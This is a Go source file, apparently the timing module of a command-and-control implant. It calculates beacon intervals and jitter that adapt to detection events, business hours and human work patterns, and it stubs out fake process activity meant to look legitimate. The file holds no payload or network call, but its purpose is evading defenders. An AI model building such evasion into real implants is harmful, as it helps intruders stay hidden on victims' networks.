package transports

/*
	Enhanced Timing and Jitter System
	Intelligent adaptive timing based on network patterns and threat landscape
*/

import (
	"math"
	"math/rand"
	"sync"
	"time"
)

// AdaptiveTimingConfig configuration for intelligent timing
type AdaptiveTimingConfig struct {
	BaseInterval        time.Duration
	MinInterval         time.Duration
	MaxInterval         time.Duration
	ThreatLevel         int // 1-10 scale
	NetworkLatency      time.Duration
	LearningRate        float64 // How fast to adapt
	BusinessHours       bool
	DomainEnvironment   string // "corporate", "home", "public"
	AdaptiveJitter      bool
	PatternAvoidance    bool
	EmulateUserBehavior bool
}

// TimingAnalyzer analyzes network patterns and adapts timing
type TimingAnalyzer struct {
	config          *AdaptiveTimingConfig
	historicalRTTs  []time.Duration
	detectionEvents []time.Time
	lastCheckin     time.Time
	adaptiveWeight  float64
	patterns        map[string]float64
	mutex           sync.RWMutex
}

// NewTimingAnalyzer creates intelligent timing analyzer
func NewTimingAnalyzer(config *AdaptiveTimingConfig) *TimingAnalyzer {
	return &TimingAnalyzer{
		config:         config,
		adaptiveWeight: 1.0,
		patterns:       make(map[string]float64),
	}
}

// CalculateNextInterval - Intelligent interval calculation
func (ta *TimingAnalyzer) CalculateNextInterval() time.Duration {
	ta.mutex.Lock()
	defer ta.mutex.Unlock()

	baseInterval := ta.config.BaseInterval

	// Apply threat level adjustment
	threatMultiplier := ta.calculateThreatMultiplier()
	baseInterval = time.Duration(float64(baseInterval) * threatMultiplier)

	// Apply network latency compensation
	if ta.config.NetworkLatency > 0 {
		latencyFactor := math.Min(2.0, float64(ta.config.NetworkLatency)/float64(time.Second))
		baseInterval = time.Duration(float64(baseInterval) * (1.0 + latencyFactor*0.1))
	}

	// Apply business hours adjustment
	if ta.config.BusinessHours {
		baseInterval = ta.applyBusinessHoursAdjustment(baseInterval)
	}

	// Apply user behavior emulation
	if ta.config.EmulateUserBehavior {
		baseInterval = ta.emulateUserBehavior(baseInterval)
	}

	// Apply pattern avoidance
	if ta.config.PatternAvoidance {
		baseInterval = ta.avoidPatterns(baseInterval)
	}

	// Ensure within bounds
	if baseInterval < ta.config.MinInterval {
		baseInterval = ta.config.MinInterval
	}
	if baseInterval > ta.config.MaxInterval {
		baseInterval = ta.config.MaxInterval
	}

	return baseInterval
}

// CalculateAdaptiveJitter - Smart jitter calculation
func (ta *TimingAnalyzer) CalculateAdaptiveJitter(baseInterval time.Duration) time.Duration {
	if !ta.config.AdaptiveJitter {
		return time.Duration(rand.Int63n(int64(baseInterval * 30 / 100))) // 30% max jitter
	}

	ta.mutex.RLock()
	defer ta.mutex.RUnlock()

	// Base jitter percentage
	jitterPercent := 0.3 // 30%

	// Increase jitter during high threat periods
	threatFactor := float64(ta.config.ThreatLevel) / 10.0
	jitterPercent += threatFactor * 0.2 // Up to 50% additional jitter

	// Adjust based on recent detection events
	recentDetections := ta.countRecentDetections(time.Hour)
	if recentDetections > 0 {
		jitterPercent += float64(recentDetections) * 0.1 // 10% per detection
	}

	// Cap jitter at 80%
	if jitterPercent > 0.8 {
		jitterPercent = 0.8
	}

	maxJitter := time.Duration(float64(baseInterval) * jitterPercent)

	// Use different probability distributions based on threat level
	if ta.config.ThreatLevel >= 7 {
		// Use exponential distribution for high threat
		return ta.exponentialJitter(maxJitter)
	} else if ta.config.ThreatLevel >= 4 {
		// Use normal distribution for medium threat
		return ta.normalJitter(maxJitter)
	} else {
		// Use uniform distribution for low threat
		return time.Duration(rand.Int63n(int64(maxJitter)))
	}
}

// calculateThreatMultiplier - Adjust interval based on threat level
func (ta *TimingAnalyzer) calculateThreatMultiplier() float64 {
	// Higher threat = longer intervals
	threatLevel := float64(ta.config.ThreatLevel)

	// Exponential scaling: threat level 1 = 1x, level 10 = 4x
	multiplier := 1.0 + (threatLevel-1.0)/9.0*3.0

	// Apply learning from detection events
	recentDetections := ta.countRecentDetections(24 * time.Hour)
	if recentDetections > 0 {
		multiplier *= 1.0 + float64(recentDetections)*0.5
	}

	return multiplier
}

// applyBusinessHoursAdjustment - Adjust timing for business context
func (ta *TimingAnalyzer) applyBusinessHoursAdjustment(interval time.Duration) time.Duration {
	now := time.Now()
	hour := now.Hour()

	// Business hours: 9 AM to 5 PM
	if hour >= 9 && hour <= 17 {
		// More frequent during business hours to blend with legitimate traffic
		return time.Duration(float64(interval) * 0.7)
	} else if hour >= 22 || hour <= 6 {
		// Less frequent during night hours
		return time.Duration(float64(interval) * 1.5)
	}

	return interval
}

// emulateUserBehavior - Make timing patterns look human
func (ta *TimingAnalyzer) emulateUserBehavior(interval time.Duration) time.Duration {
	now := time.Now()

	// Lunch break behavior (12-1 PM)
	if now.Hour() == 12 {
		return time.Duration(float64(interval) * 2.0) // Longer breaks during lunch
	}

	// Morning rush (8-10 AM)
	if now.Hour() >= 8 && now.Hour() <= 10 {
		return time.Duration(float64(interval) * 0.8) // More active in morning
	}

	// Afternoon slowdown (2-4 PM)
	if now.Hour() >= 14 && now.Hour() <= 16 {
		return time.Duration(float64(interval) * 1.2) // Slower in afternoon
	}

	// Weekend behavior
	if now.Weekday() == time.Saturday || now.Weekday() == time.Sunday {
		return time.Duration(float64(interval) * 3.0) // Much less active on weekends
	}

	return interval
}

// avoidPatterns - Prevent predictable timing patterns
func (ta *TimingAnalyzer) avoidPatterns(interval time.Duration) time.Duration {
	// Track patterns and avoid repetition
	intervalStr := interval.String()

	if usage, exists := ta.patterns[intervalStr]; exists {
		// If this interval has been used frequently, add variation
		if usage > 5.0 {
			variation := 1.0 + (rand.Float64()-0.5)*0.4 // ±20% variation
			interval = time.Duration(float64(interval) * variation)
		}
	}

	// Update pattern tracking
	ta.patterns[intervalStr]++

	// Decay old patterns
	for k, v := range ta.patterns {
		ta.patterns[k] = v * 0.95 // 5% decay
		if ta.patterns[k] < 0.1 {
			delete(ta.patterns, k)
		}
	}

	return interval
}

// exponentialJitter - Exponential distribution jitter
func (ta *TimingAnalyzer) exponentialJitter(maxJitter time.Duration) time.Duration {
	// Exponential distribution favors shorter jitters
	lambda := 2.0
	u := rand.Float64()
	jitter := -math.Log(1-u) / lambda

	// Scale to max jitter
	jitter = jitter / 3.0 // Normalize approximately
	if jitter > 1.0 {
		jitter = 1.0
	}

	return time.Duration(float64(maxJitter) * jitter)
}

// normalJitter - Normal distribution jitter
func (ta *TimingAnalyzer) normalJitter(maxJitter time.Duration) time.Duration {
	// Normal distribution centered at 50% of max jitter
	mean := 0.5
	stddev := 0.2

	jitter := rand.NormFloat64()*stddev + mean
	if jitter < 0 {
		jitter = 0
	}
	if jitter > 1.0 {
		jitter = 1.0
	}

	return time.Duration(float64(maxJitter) * jitter)
}

// countRecentDetections - Count detection events in time window
func (ta *TimingAnalyzer) countRecentDetections(window time.Duration) int {
	cutoff := time.Now().Add(-window)
	count := 0

	for _, detectionTime := range ta.detectionEvents {
		if detectionTime.After(cutoff) {
			count++
		}
	}

	return count
}

// RecordDetection - Record a detection event
func (ta *TimingAnalyzer) RecordDetection() {
	ta.mutex.Lock()
	defer ta.mutex.Unlock()

	ta.detectionEvents = append(ta.detectionEvents, time.Now())

	// Keep only recent detections (last 7 days)
	cutoff := time.Now().Add(-7 * 24 * time.Hour)
	filtered := make([]time.Time, 0)
	for _, t := range ta.detectionEvents {
		if t.After(cutoff) {
			filtered = append(filtered, t)
		}
	}
	ta.detectionEvents = filtered

	// Immediately increase threat level
	if ta.config.ThreatLevel < 10 {
		ta.config.ThreatLevel++
	}
}

// RecordSuccessfulCheckin - Record successful communication
func (ta *TimingAnalyzer) RecordSuccessfulCheckin(rtt time.Duration) {
	ta.mutex.Lock()
	defer ta.mutex.Unlock()

	ta.lastCheckin = time.Now()
	ta.historicalRTTs = append(ta.historicalRTTs, rtt)

	// Keep only recent RTTs
	if len(ta.historicalRTTs) > 100 {
		ta.historicalRTTs = ta.historicalRTTs[1:]
	}

	// Gradually decrease threat level on successful checkins
	if ta.config.ThreatLevel > 1 && rand.Float64() < 0.1 { // 10% chance
		ta.config.ThreatLevel--
	}
}

// GetNetworkLatency - Calculate average network latency
func (ta *TimingAnalyzer) GetNetworkLatency() time.Duration {
	ta.mutex.RLock()
	defer ta.mutex.RUnlock()

	if len(ta.historicalRTTs) == 0 {
		return 0
	}

	var total time.Duration
	for _, rtt := range ta.historicalRTTs {
		total += rtt
	}

	return total / time.Duration(len(ta.historicalRTTs))
}

// AdaptiveSleep - Intelligent sleep with environmental awareness
func AdaptiveSleep(duration time.Duration, config *AdaptiveTimingConfig) {
	if config == nil {
		time.Sleep(duration)
		return
	}

	// Break long sleeps into smaller chunks for better responsiveness
	if duration > 5*time.Minute {
		chunks := int(duration / (2 * time.Minute))
		chunkDuration := duration / time.Duration(chunks)

		for i := 0; i < chunks; i++ {
			time.Sleep(chunkDuration)

			// Add micro-jitter between chunks
			microJitter := time.Duration(rand.Int63n(int64(time.Second)))
			time.Sleep(microJitter)
		}
	} else {
		time.Sleep(duration)
	}
}

// EmulateProcessActivity - Simulate legitimate process activity during sleep
func EmulateProcessActivity(duration time.Duration) {
	// Simulate file system activity, network requests, etc.
	// This makes the process look more legitimate during sleep periods

	chunks := int(duration / (30 * time.Second))
	if chunks < 1 {
		chunks = 1
	}

	chunkDuration := duration / time.Duration(chunks)

	for i := 0; i < chunks; i++ {
		time.Sleep(chunkDuration)

		// Simulate activity (in real implementation)
		// - Touch files
		// - Make DNS requests
		// - Access registry
		// - Allocate/free memory
		// This is just a placeholder
		_ = time.Now()
	}
}
